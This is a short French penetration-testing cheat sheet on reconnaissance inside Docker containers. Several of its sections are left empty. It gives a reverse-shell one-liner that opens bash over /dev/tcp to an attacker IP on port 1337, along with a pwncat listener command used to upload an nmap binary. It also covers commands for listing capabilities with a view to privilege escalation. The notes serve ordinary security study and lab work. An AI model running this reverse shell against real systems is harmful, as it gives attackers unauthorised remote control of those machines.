# Reconnaissance
Un fichier .dockerenv à la racine du système révèle le fait que l'on est dans un conteneur docker.
De plus la commande <code>hostname</code> peut donner un indice 
# Scanning & Enumeration
## Scan réseau
Utilisation du binaire statique de nmap https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap.
Pour l'envoyer sur la machine :  
1. Côté attaquant:
<code>pwncat-cs -lp 1337</code>

2. Côté cible
<code>bash -c 'bash -i >& /dev/tcp/$YOUR_IP/1337 0>&1'</code>

3. Côté attaquant
<code>upload /chemin/nmap</code>

# Exploitation (Gaining Access)

# Privilege Escalation
## Lister les capabilities
```console
capsh --print
```
Liste des exploists liés aux capabilities https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search 
# Lateral Movement

# Resources
